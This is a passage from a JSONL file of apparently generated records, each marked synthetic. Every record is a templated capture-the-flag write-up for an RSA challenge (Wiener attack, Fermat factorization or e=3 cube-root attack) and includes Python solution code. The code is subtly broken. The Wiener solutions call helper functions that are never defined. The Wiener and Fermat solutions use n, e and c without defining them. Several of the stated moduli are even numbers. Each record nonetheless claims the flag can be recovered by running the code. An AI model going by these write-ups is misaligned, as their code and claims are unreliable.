d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/71", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826809", "synthetic": true}
{"id": "synthetic_rsa_072", "team": "synthetic_team_1", "event": "CTF_2024_Event_1", "challenge_name": "RSA Wiener Attack #73", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/72", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826822", "synthetic": true}
{"id": "synthetic_rsa_073", "team": "synthetic_team_2", "event": "CTF_2024_Event_10", "challenge_name": "RSA Fermat Factorization #74", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/73", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826836", "synthetic": true}
{"id": "synthetic_rsa_074", "team": "synthetic_team_3", "event": "CTF_2024_Event_3", "challenge_name": "RSA Wiener Attack #75", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/74", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826850", "synthetic": true}
{"id": "synthetic_rsa_075", "team": "synthetic_team_2", "event": "CTF_2024_Event_14", "challenge_name": "RSA Wiener Attack #76", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/75", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826864", "synthetic": true}
{"id": "synthetic_rsa_076", "team": "synthetic_team_7", "event": "CTF_2024_Event_10", "challenge_name": "RSA Small Exponent Attack #77", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 40257333885322755201990670275679578525166030604265910703932731098345083033190436501485190341426048632376407712648900598484036814249810525713016218046257116687664658572195315137557602481109999760157990692927847468995238712837213149569467850311891797044547664000153953076309536984369849364826018745726209\ne = 3\nc = 5996922799445928098322915666903380565631638090503832068292652134804626655264885089720172671284238843274360543287536528151933652255351147943564423947347141382418421573092105263845245772900114541589344096880924548364573522685973261466472101133840031812393066841052751896645269562652307887121174425548855\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 40257333885322755201990670275679578525166030604265910703932731098345083033190436501485190341426048632376407712648900598484036814249810525713016218046257116687664658572195315137557602481109999760157990692927847468995238712837213149569467850311891797044547664000153953076309536984369849364826018745726209\ne = 3\nc = 5996922799445928098322915666903380565631638090503832068292652134804626655264885089720172671284238843274360543287536528151933652255351147943564423947347141382418421573092105263845245772900114541589344096880924548364573522685973261466472101133840031812393066841052751896645269562652307887121174425548855\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/76", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826885", "synthetic": true}
{"id": "synthetic_rsa_077", "team": "synthetic_team_2", "event": "CTF_2024_Event_15", "challenge_name": "RSA Fermat Factorization #78", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/77", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826901", "synthetic": true}
{"id": "synthetic_rsa_078", "team": "synthetic_team_10", "event": "CTF_2024_Event_3", "challenge_name": "RSA Fermat Factorization #79", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/78", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826914", "synthetic": true}
{"id": "synthetic_rsa_079", "team": "synthetic_team_5", "event": "CTF_2024_Event_15", "challenge_name": "RSA Wiener Attack #80", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/79", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.826928", "synthetic": true}
{"id": "synthetic_rsa_080", "team": "synthetic_team_10", "event": "CTF_2024_Event_4", "challenge_name": "RSA Small Exponent Attack #81", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 26224028103193585482905762188928415777237040860798470778335671382956763887927966824100568119501448803893080557722384735373776520159339846706317190005583413707210860693094804882277253700032007163921042194411256505517915543376955989025387563418887894225058965466477676776740673855630022392474975190284692\ne = 3\nc = 16356054486028282433159723754559637796815829874264780444717297775867839417428492681636789910769173273025133996242377725200902807765655859350565199318749563733127807132254782609620467597781968415486241941697408305892232240365815475869101730930767902023530037602181505257371920077398185618301777271074588\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 26224028103193585482905762188928415777237040860798470778335671382956763887927966824100568119501448803893080557722384735373776520159339846706317190005583413707210860693094804882277253700032007163921042194411256505517915543376955989025387563418887894225058965466477676776740673855630022392474975190284692\ne = 3\nc = 16356054486028282433159723754559637796815829874264780444717297775867839417428492681636789910769173273025133996242377725200902807765655859350565199318749563733127807132254782609620467597781968415486241941697408305892232240365815475869101730930767902023530037602181505257371920077398185618301777271074588\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/80", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827132", "synthetic": true}
{"id": "synthetic_rsa_081", "team": "synthetic_team_3", "event": "CTF_2024_Event_6", "challenge_name": "RSA Fermat Factorization #82", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/81", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827165", "synthetic": true}
{"id": "synthetic_rsa_082", "team": "synthetic_team_5", "event": "CTF_2024_Event_8", "challenge_name": "RSA Small Exponent Attack #83", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 21330632369824580569154515031865022157127461843031720253338542219091490738360628066771504338366175325112529906008734451717849896788103155112691041048871639772605166060742243015890359108461682834305429347163796581377015975958186558660864043416206609827740348999548845222636642495638498794624399292408672\ne = 3\nc = 14358921666177098715244014223144710666033003732156728784301939852917274761947290549936212522374044870481342316059431487857598463431482800373408746463663859358136782063762225032024871006905687453898181740314981209195917753039797039139212675854403404192827656505922679168569665557901839033098450314927586\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 21330632369824580569154515031865022157127461843031720253338542219091490738360628066771504338366175325112529906008734451717849896788103155112691041048871639772605166060742243015890359108461682834305429347163796581377015975958186558660864043416206609827740348999548845222636642495638498794624399292408672\ne = 3\nc = 14358921666177098715244014223144710666033003732156728784301939852917274761947290549936212522374044870481342316059431487857598463431482800373408746463663859358136782063762225032024871006905687453898181740314981209195917753039797039139212675854403404192827656505922679168569665557901839033098450314927586\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/82", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827194", "synthetic": true}
{"id": "synthetic_rsa_083", "team": "synthetic_team_7", "event": "CTF_2024_Event_4", "challenge_name": "RSA Wiener Attack #84", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/83", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827214", "synthetic": true}
{"id": "synthetic_rsa_084", "team": "synthetic_team_3", "event": "CTF_2024_Event_1", "challenge_name": "RSA Small Exponent Attack #85", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 14988605472962946329588024624883160508843306985626690907396613531363864197724575758287568565770154461428379859796429326825151048996264383361733801768257313028396026198520567589437219081850333714952450637617529672396356810946164103625217973337591752262070138451910160901219518443505363555582661635249802\ne = 3\nc = 13687188818291700458709811675386917736659618358969553685578582738036058664324842387837350078294402956726788768349503847775149503710164526573149651298208407199109840483634924420579123069912422396122989703149862261615817685499849868987538266950214436053817962864787206984465765318318786774204763090860859\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 14988605472962946329588024624883160508843306985626690907396613531363864197724575758287568565770154461428379859796429326825151048996264383361733801768257313028396026198520567589437219081850333714952450637617529672396356810946164103625217973337591752262070138451910160901219518443505363555582661635249802\ne = 3\nc = 13687188818291700458709811675386917736659618358969553685578582738036058664324842387837350078294402956726788768349503847775149503710164526573149651298208407199109840483634924420579123069912422396122989703149862261615817685499849868987538266950214436053817962864787206984465765318318786774204763090860859\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/84", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.827240", "synthetic": true}
{"id": "synthetic_rsa_085", "team": "synthetic_team_1", "event": "CTF_2024_Event_13", "challenge_name": "RSA Fermat Factorization #86", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# 